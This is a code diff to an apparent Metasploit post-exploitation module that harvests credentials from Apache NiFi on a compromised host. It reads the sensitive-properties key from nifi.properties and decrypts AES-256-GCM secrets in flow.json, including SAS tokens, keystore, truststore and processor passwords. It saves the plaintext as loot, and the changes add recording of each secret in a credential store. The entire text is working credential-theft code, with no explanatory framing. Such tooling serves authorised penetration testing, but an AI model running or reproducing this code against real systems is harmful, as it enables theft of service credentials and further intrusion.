@@ -155,9 +155,10 @@ class MetasploitModule < Msf::Post
     information << ", storage-endpoint-suffix: #{service['storage-endpoint-suffix']}" if service['storage-endpoint-suffix']
     table_username = client_id_decrypt.empty? ? '' : "managed-identity-client-id: #{client_id_decrypt}"
 
-    @flow_json_string = @flow_json_string.gsub(service['storage-sas-token'], sas_token_decrypt)
-    @flow_json_string = @flow_json_string.gsub(service['storage-account-name'], storage_account_name_decrypt)
-    @flow_json_string = @flow_json_string.gsub(service['managed-identity-client-id'], client_id_decrypt) unless client_id_decrypt.empty?
+    replace_encrypted_value(service['storage-sas-token'], sas_token_decrypt)
+    replace_encrypted_value(service['storage-account-name'], storage_account_name_decrypt)
+    replace_encrypted_value(service['managed-identity-client-id'], client_id_decrypt) unless client_id_decrypt.empty?
+    store_flow_credential(sas_token_decrypt)
     table_entries << [name, table_username, sas_token_decrypt, information]
     table_entries
   end
@@ -177,7 +178,8 @@ class MetasploitModule < Msf::Post
 
       password_decrypt = decrypt_aes_256_gcm(password, @decrypted_key)
       table_entries << [name, '', password_decrypt, "Property name: #{property_name}"]
-      @flow_json_string = @flow_json_string.gsub(property_value, password_decrypt)
+      replace_encrypted_value(property_value, password_decrypt)
+      store_flow_credential(password_decrypt)
     end
     table_entries
   end
@@ -193,7 +195,8 @@ class MetasploitModule < Msf::Post
 
     password_decrypt = decrypt_aes_256_gcm(password, @decrypted_key)
     table_entries << [name, username, password_decrypt, "URL: #{url}"]
-    @flow_json_string = @flow_json_string.gsub(processor['Password'], password_decrypt)
+    replace_encrypted_value(processor['Password'], password_decrypt)
+    store_flow_credential(password_decrypt, username: username)
     table_entries
   end
 
@@ -206,7 +209,8 @@ class MetasploitModule < Msf::Post
       unless password.nil?
         password_decrypt = decrypt_aes_256_gcm(password, @decrypted_key)
         table_entries << [name, username, password_decrypt, '']
-        @flow_json_string = @flow_json_string.gsub(controller_properties['Keystore Password'], password_decrypt)
+        replace_encrypted_value(controller_properties['Keystore Password'], password_decrypt)
+        store_flow_credential(password_decrypt)
       end
     end
 
@@ -217,20 +221,22 @@ class MetasploitModule < Msf::Post
       unless password.nil?
         password_decrypt = decrypt_aes_256_gcm(password, @decrypted_key)
         table_entries << [name, username, password_decrypt, "Truststore Type #{controller_properties['Truststore Type']}"]
-        @flow_json_string = @flow_json_string.gsub(controller_properties['Truststore Password'], password_decrypt)
+        replace_encrypted_value(controller_properties['Truststore Password'], password_decrypt)
+        store_flow_credential(password_decrypt)
       end
     end
 
-    return table_entries unless controller_properties['Truststore Filename'] && controller_properties['key-password']
+    return table_entries unless controller_properties['Keystore Filename'] && controller_properties['key-password']
 
     name = 'Key Password'
-    username = controller_properties['Truststore Filename']
+    username = controller_properties['Keystore Filename']
     password = parse_aes_256_gcm_enc_string(controller_properties['key-password'])
     return table_entries if password.nil?
 
     password_decrypt = decrypt_aes_256_gcm(password, @decrypted_key)
-    table_entries << [name, username, password_decrypt, "Truststore Type #{controller_properties['Truststore Type']}"]
-    @flow_json_string = @flow_json_string.gsub(controller_properties['key-password'], password_decrypt)
+    table_entries << [name, username, password_decrypt, "Keystore Type #{controller_properties['Keystore Type']}"]
+    replace_encrypted_value(controller_properties['key-password'], password_decrypt)
+    store_flow_credential(password_decrypt)
 
     table_entries
   end
@@ -247,7 +253,7 @@ class MetasploitModule < Msf::Post
 
     decrypted_text = cipher.update([enc_fields[:ciphertext]].pack('H*'))
     decrypted_text << cipher.final
-    decrypted_text
+    decrypted_text.force_encoding(::Encoding::UTF_8)
   end
 
   def parse_aes_256_gcm_enc_string(password)
@@ -255,28 +261,72 @@ class MetasploitModule < Msf::Post
     password.match(/(?<nonce>\w{32})(?<ciphertext>\w+)(?<auth_tag>\w{32})/) # parse out the fields
   end
 
-  def run
-    unless (flow_file && properties_file) || identity_file
-      fail_with(Failure::NotFound, 'Unable to find login-identity-providers.xml, nifi.properties and/or flow.json.gz files')
-    end
+  # Replace a complete JSON string value so quotes and backslashes in a secret
+  # cannot corrupt the collected document. The block preserves literal bytes
+  # instead of interpreting String#gsub replacement escapes.
+  # @param encrypted_value [String] Original encrypted property value.
+  # @param plaintext [String] Decrypted property value.
+  # @return [String] The updated serialized flow.
+  def replace_encrypted_value(encrypted_value, plaintext)
+    @flow_json_string = @flow_json_string.gsub(JSON.generate(encrypted_value)) { JSON.generate(plaintext) }
+  end
+
+  # Stored configuration is not proof of service authentication. Keep these
+  # secrets attached to the session without inventing a login or an account
+  # name for keystores, generic sensitive fields or SAS tokens.
+  # @param password [String] Decrypted secret.
+  # @param username [String, nil] Account name when explicitly present.
+  # @return [Metasploit::Credential::Core, nil] The persisted core when available.
+  def store_flow_credential(password, username: nil)
+    credential_data = {
+      origin_type: :session,
+      post_reference_name: refname,
+      private_type: :password,
+      private_data: password,
+      session_id: session_db_id,
+      workspace_id: myworkspace_id
+    }
+    credential_data[:username] = username if username.present?
+    create_credential(credential_data)
+  end
+
+  # @param table [Rex::Text::Table] Collected flow values.
+  # @return [void]
+  def gather_flow_values(table)
+    return unless properties_file
 
     properties = read_file(properties_file)
+    if properties.blank?
+      print_warning('Unable to read NiFi properties data')
+      return
+    end
+
     path = store_loot('nifi.properties', 'text/plain', session, properties, 'nifi.properties', 'nifi properties file')
     print_good("properties data saved in: #{path}")
-    key = properties.scan(/^nifi.sensitive.props.key=(.+)$/).flatten.first.strip
-    fail_with(Failure::NotFound, 'Unable to find nifi.properties and/or flow.json.gz files') if key.nil?
+    key = properties[/^nifi.sensitive.props.key=(.+)$/, 1]&.strip
+    if key.blank?
+      print_warning('Unable to find NiFi sensitive properties key')
+      return
+    end
+
     print_good("Key: #{key}")
     # https://rubular.com/r/N0w0WHTjjdKXHZ
     # https://nifi.apache.org/docs/nifi-docs/html/administration-guide.html#property-encryption-algorithms
     # https://nifi.apache.org/docs/nifi-docs/html/administration-guide.html#java-cryptography-extension-jce-limited-strength-jurisdiction-policies
-    algorithm = properties.scan(/^nifi.sensitive.props.algorithm=([\w-]+)$/).flatten.first.strip
-    fail_with(Failure::NotFound, 'Unable to find nifi.properties and/or flow.json.gz files') if algorithm.nil?
-
-    columns = ['Name', 'Username', 'Password', 'Other Information']
-    table = Rex::Text::Table.new('Header' => 'NiFi Flow Data', 'Indent' => 1, 'Columns' => columns)
+    algorithm = properties[/^nifi.sensitive.props.algorithm=([\w-]+)$/, 1]&.strip
+    if algorithm.blank?
+      print_warning('Unable to find NiFi sensitive properties algorithm')
+      return
+    end
 
     if flow_file
-      flow_json = Zlib.gunzip(read_file(flow_file))
+      compressed_flow = read_file(flow_file)
+      if compressed_flow.blank?
+        print_warning('Unable to read NiFi flow data')
+        return
+      end
+
+      flow_json = Zlib.gunzip(compressed_flow)
 
       path = store_loot('nifi.flow.json', 'application/json', session, flow_json, 'flow.json', 'nifi flow data')
       print_good("Original data containing encrypted fields saved in: #{path}")
@@ -326,6 +376,26 @@ class MetasploitModule < Msf::Post
         print_good("Decrypted data saved in: #{path}")
       end
     end
+  rescue OpenSSL::Cipher::CipherError => e
+    print_error('Unable to decrypt NiFi flow: encrypted data could not be authenticated')
+    elog('Unable to decrypt NiFi flow', error: e)
+  end
+
+  def run
+    @flow_file = nil
+    @properties_file = nil
+    @identity_file = nil
+    @authorizers_file = nil
+    @flow_json_string = nil
+    @decrypted_key = nil
+
+    unless (flow_file && properties_file) || identity_file
+      fail_with(Failure::NotFound, 'Unable to find login-identity-providers.xml, nifi.properties and/or flow.json.gz files')
+    end
+
+    columns = ['Name', 'Username', 'Password', 'Other Information']
+    table = Rex::Text::Table.new('Header' => 'NiFi Flow Data', 'Indent' => 1, 'Columns' => columns)
+    gather_flow_values(table)
 
     vprint_status('Checking identity file')
     if identity_file
